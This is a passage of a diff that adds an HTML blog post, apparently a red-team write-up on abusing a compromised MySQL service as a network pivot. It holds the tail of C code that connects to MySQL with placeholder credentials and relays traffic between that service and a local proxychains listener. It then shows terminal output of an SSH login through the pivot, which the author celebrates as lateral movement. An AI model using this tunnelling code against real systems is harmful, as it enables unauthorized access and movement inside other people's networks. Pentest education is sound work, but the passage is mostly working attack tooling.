+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">ERROR: could not bind!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">localfd</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">ERROR: could not listen!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="n">clientlen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">[ RUN YOUR PROXYCHAINS NOW ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	
+	<span class="k">if</span> <span class="p">((</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">localfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clientlen</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">ERROR: could not accept!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	
+	
+
+	
+	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
+		<span class="n">maxfd</span> <span class="o">=</span> <span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">select_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">?</span> <span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="n">select_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+		<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">FD_SET</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>  <span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="n">sr</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span><span class="n">maxfd</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tv</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">sr</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"ERROR: Select failed, something went reaaaally wrong!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">sr</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+				<span class="k">if</span><span class="p">(</span><span class="n">FD_ISSET</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">))</span> <span class="p">{</span>
+					<span class="n">memset</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
+					<span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+						<span class="n">nread</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">test</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
+						<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"-&gt; %d packets from server</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">nread</span><span class="p">);</span>
+						<span class="n">write</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">test</span><span class="p">,</span> <span class="n">nread</span><span class="p">);</span>
+					<span class="p">}</span>
+					<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+						<span class="n">nread</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">test</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
+						<span class="k">if</span> <span class="p">(</span><span class="n">nread</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">){</span>
+							<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"ERROR: could not read from proxychains!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+							<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+						<span class="p">}</span>
+						<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"&lt;- %d packets from proxychains</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">nread</span><span class="p">);</span>
+						<span class="n">write</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">test</span><span class="p">,</span> <span class="n">nread</span><span class="p">);</span>
+					<span class="p">}</span>
+				<span class="p">}</span>	
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	
+	
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">MYSQL</span> <span class="o">*</span><span class="n">con</span> <span class="o">=</span> <span class="n">mysql_init</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="n">con</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mysql_error</span><span class="p">(</span><span class="n">con</span><span class="p">));</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">mysql_real_connect</span><span class="p">(</span><span class="n">con</span><span class="p">,</span> <span class="s">"Y.Y.Y.Y"</span><span class="p">,</span> <span class="s">"username"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mysql_error</span><span class="p">(</span><span class="n">con</span><span class="p">));</span>
+		<span class="n">mysql_close</span><span class="p">(</span><span class="n">con</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="n">proxy_init</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>        
+Compile and run:</p>
+
+<p>(Terminal 1)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@insularaptor:/tmp# ./MyShellQL 
+[ SERVER BANNER ]
+
+Now I am become Death
+And this is my Child
+
+[ RUN YOUR PROXYCHAINS NOW ]
+</code></pre></div></div>
+
+<p>(Terminal 2)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@insularaptor:/tmp# proxychains ssh mothra@192.168.245.197
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-&lt;&gt;-127.0.0.1:1337-&lt;&gt;&lt;&gt;-192.168.245.197:22-&lt;&gt;&lt;&gt;-OK
+mothra@192.168.245.197's password: 
+Linux arcadia 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Dec  7 19:22:36 2019 from 127.0.0.1
+mothra@arcadia:~|⇒  exit
+Connection to 192.168.245.197 closed.
+
+</code></pre></div></div>
+
+<p>        
+Hohoho we just did ssh using the compromised MySQL service as proxy! What a lovely way to perform lateral movements! <strong>:)</strong></p>
+
+<h2 id="final-words">Final words</h2>
+<p>        
+UDFs are a powerful tool to use in Red Team exercises or in classical pentests. I hope the idea of using mysqld to pivot can be useful to you, or at minimum, funny enough. If this article has been helpful to you, or you find an error/typo, feel free to contact me at <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>.</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
